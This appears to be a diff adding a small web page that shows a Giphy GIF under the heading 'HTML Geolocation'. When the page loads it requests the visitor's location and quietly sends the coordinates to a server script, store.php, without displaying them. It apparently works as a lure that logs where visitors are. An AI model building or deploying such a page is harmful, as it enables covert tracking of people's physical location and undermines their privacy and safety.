@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()">
+    
+    
+<iframe src="https://giphy.com/embed/YTJXDIivNSMgc0" width="442" height="480" frameBorder="" class="giphy-embed" allowFullscreen><p><a href="images.jpg">via Giphy</a></p></iframe>
+    
+    
+    
+<h1>HTML Geolocation</h1>
+
+
+
+<p id="demo"></p>
+
+<script>
+const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+    const xhttp = new XMLHttpRequest();
+    xhttp.open("GET", "store.php?lat=" + position.coords.latitude +"&long=" + position.coords.longitude);
+    xhttp.send();
+}
+</script>
+
+</body>
+</html>
